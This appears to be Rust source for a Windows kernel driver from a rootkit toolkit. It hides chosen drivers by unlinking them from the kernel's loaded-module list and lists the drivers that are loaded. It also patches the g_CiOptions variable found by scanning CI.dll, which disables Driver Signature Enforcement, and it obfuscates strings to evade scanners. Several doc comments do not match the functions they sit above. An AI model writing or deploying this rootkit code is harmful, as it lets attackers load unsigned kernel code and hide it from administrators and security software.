use {
    obfstr::obfstr,
    spin::{mutex::Mutex, lazy::Lazy},
    ntapi::ntldr::LDR_DATA_TABLE_ENTRY,
    core::sync::atomic::{AtomicPtr, Ordering}, 
    alloc::{string::String, vec::Vec, boxed::Box},
    crate::utils::{get_function_address, get_module_base_address, uni}, 
    shared::{
        structs::{
            DriverInfo, DSE, HiddenDriverInfo, LIST_ENTRY,
            TargetDriver
        }, 
        vars::MAX_DRIVER
    },
    wdk_sys::{
        ntddk::MmGetSystemRoutineAddress, STATUS_INVALID_PARAMETER, 
        NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL,
    }, 
};


/// List of target drivers protected by a mutex.
static DRIVER_INFO_HIDE: Lazy<Mutex<Vec<HiddenDriverInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER))); 

pub struct Driver;

impl Driver {
    /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
    ///
    /// # Parameters
    /// - `process`:  A pointer to the `TargetProcess` structure.
    ///
    /// # Returns
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn driver_toggle(driver: *mut TargetDriver) -> NTSTATUS {
        let name = &(*driver).name;
        let status = if (*driver).enable {
            Self::hide_driver(name)
        } else {
            Self::unhide_driver(name)
        };
        
        status
    }

    /// Hides the driver by unlinking it from the loaded module list.
    ///
    /// # Parameters
    /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    ///
    unsafe fn hide_driver(driver_name: &String) -> NTSTATUS {
        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
        let func = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;

        if func.is_null() {
            log::error!("PsLoadedModuleList is null");
            return STATUS_UNSUCCESSFUL;
        }

        let current = func as *mut LIST_ENTRY;
        let mut next = (*func).InLoadOrderLinks.Flink as *mut LIST_ENTRY;

        while next != current {
            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            let buffer = core::slice::from_raw_parts(
                (*list_entry).BaseDllName.Buffer,
                ((*list_entry).BaseDllName.Length / 2) as usize,
            );
            
            let name = String::from_utf16_lossy(buffer);
            if name.contains(driver_name) {
                log::info!("Driver found: {name}");
                let next = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
                let previous = (*list_entry).InLoadOrderLinks.Blink as *mut LDR_DATA_TABLE_ENTRY;
                let list = LIST_ENTRY {
                    Flink: next as *mut LIST_ENTRY,
                    Blink: previous as *mut LIST_ENTRY,
                };

                let mut driver_info = DRIVER_INFO_HIDE.lock();
                let list_ptr = Box::into_raw(Box::new(list));
                let driver_entry = Box::into_raw(Box::new(*list_entry));
                log::info!("Stored list entry at: {:?}", list_ptr);
            
                driver_info.push(HiddenDriverInfo  {
                    name,
                    list_entry: AtomicPtr::new(list_ptr),
                    driver_entry: AtomicPtr::new(driver_entry)
                });
                
                (*next).InLoadOrderLinks.Blink = previous as *mut winapi::shared::ntdef::LIST_ENTRY;
                (*previous).InLoadOrderLinks.Flink = next as *mut winapi::shared::ntdef::LIST_ENTRY;

                (*list_entry).InLoadOrderLinks.Flink = list_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
                (*list_entry).InLoadOrderLinks.Blink = list_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
                break;
            }

            next = (*next).Flink;
        }
        
        STATUS_SUCCESS
    }

    /// Hides the driver by unlinking it from the loaded module list.
    ///
    /// # Parameters
    /// - `device`: A pointer to the `DEVICE_OBJECT` representing the driver to be hidden.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    ///
    unsafe fn unhide_driver(driver_name: &String) -> NTSTATUS {
        let mut driver_info = DRIVER_INFO_HIDE.lock();
        if let Some(index) = driver_info.iter().position(|p| p.name == driver_name.as_str()) {
            let driver = &driver_info[index];
            let list = driver.list_entry.load(Ordering::SeqCst);
            let driver_entry = driver.driver_entry.load(Ordering::SeqCst);
            if list.is_null() {
                log::error!("List entry stored in AtomicPtr is null");
                return STATUS_INVALID_PARAMETER;
            }

            (*driver_entry).InLoadOrderLinks.Flink = (*list).Flink as *mut winapi::shared::ntdef::LIST_ENTRY;
            (*driver_entry).InLoadOrderLinks.Blink = (*list).Blink as *mut winapi::shared::ntdef::LIST_ENTRY;

            let next = (*driver_entry).InLoadOrderLinks.Flink; // Driver (3)
            let previous = (*driver_entry).InLoadOrderLinks.Blink; // Driver (1)

            (*next).Blink = driver_entry as *mut winapi::shared::ntdef::LIST_ENTRY;
            (*previous).Flink = driver_entry as *mut winapi::shared::ntdef::LIST_ENTRY;

            driver_info.remove(index);
        } else {
            log::info!("Driver ({driver_name}) Not found");
            return STATUS_UNSUCCESSFUL;
        }
        
        STATUS_SUCCESS
    }

    /// Enumerates loaded drivers and stores the information in the provided buffer.
    ///
    /// # Parameters
    /// - `driver_info`: A pointer to a buffer where `DriverInfo` structures will be stored.
    /// - `information`: A mutable reference to a `usize` that will store the total size of the information written.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    ///
    pub unsafe fn enumerate_driver(driver_info: *mut DriverInfo, information: &mut usize) -> NTSTATUS {
        log::info!("Starting module enumeration");
    
        let ps_module = uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
        let func = MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY;
    
        if func.is_null() {
            log::error!("PsLoadedModuleList is null");
            return STATUS_UNSUCCESSFUL;
        }
    
        let current = func as *mut winapi::shared::ntdef::LIST_ENTRY;
        let mut next = (*func).InLoadOrderLinks.Flink;
        let mut count = 0;
    
        while next != current {
            let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
            let buffer = core::slice::from_raw_parts(
                (*list_entry).BaseDllName.Buffer,
                ((*list_entry).BaseDllName.Length / 2) as usize,
            );
    
            // Driver name
            let name = (*driver_info.offset(count)).name.as_mut();
            core::ptr::copy_nonoverlapping(buffer.as_ptr(), name.as_mut_ptr(), buffer.len());
    
            // Driver address
            (*driver_info.offset(count)).address = (*list_entry).DllBase as usize;

            // Driver index
            (*driver_info.offset(count)).index = count as u8;
    
            *information += core::mem::size_of::<DriverInfo>();
            count += 1;
    
            next = (*next).Flink;
        }
    
        STATUS_SUCCESS
    }

    /// Sets the DSE (Driver Signature Enforcement) status based on the information provided.
    /// 
    /// # Parameters
    /// - `info_dse`: A pointer to the `DSE` structure containing information about the state of the DSE.
    /// 
    /// # Return
    /// - `NTSTATUS`: A status code indicating success (`STATUS_SUCCESS`) or failure of the operation.
    /// 
    pub unsafe fn set_dse_state(info_dse: *mut DSE) -> NTSTATUS {
        let module_address = match get_module_base_address(obfstr!("CI.dll")) {
            Some(addr) => addr,
            None => return STATUS_UNSUCCESSFUL
        };
        let function_address = match get_function_address(obfstr!("CiInitialize"), module_address) {
            Some(addr) => addr,
            None => return STATUS_UNSUCCESSFUL,
        };

        let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 0x89);

        // mov ecx,ebp
        let instructions = [0x8B, 0xCD];

        if let Some(y) = function_bytes.windows(instructions.len()).position(|x| *x == instructions) {
            let position = y + 3;
            let offset = function_bytes[position..position + 4]
                .try_into()
                .map(u32::from_le_bytes)
                .expect("Slice length is not 4, cannot convert");
        
            let new_base = function_address.cast::<u8>().offset((position + 4) as isize);
            let c_ip_initialize = new_base.cast::<u8>().offset(offset as isize);
            log::info!("c_ip_initialize: {:?}", c_ip_initialize);

            // mov rbp,r9
            let instructions = [0x49, 0x8b, 0xE9];

            let c_ip_initialize_slice = core::slice::from_raw_parts(c_ip_initialize as *const u8, 0x21);

            if let Some(i) = c_ip_initialize_slice.windows(instructions.len()).position(|windows| *windows == instructions) {
                let position = i + 5;
                let offset = c_ip_initialize_slice[position..position + 4]
                    .try_into()
                    .map(u32::from_le_bytes)
                    .expect("Slice length is not 4, cannot convert");

                let new_offset = 0xffffffff00000000 + offset as u64;
                let new_base = c_ip_initialize.cast::<u8>().offset((position + 4) as isize);
                let g_ci_options = new_base.cast::<u8>().offset(new_offset as isize);

                if (*info_dse).enable {
                    *(g_ci_options as *mut u64) = 0x0006 as u64;
                } else {
                    *(g_ci_options as *mut u64) = 0x000E as u64;
                }
            }
        }

        STATUS_SUCCESS
    }

}
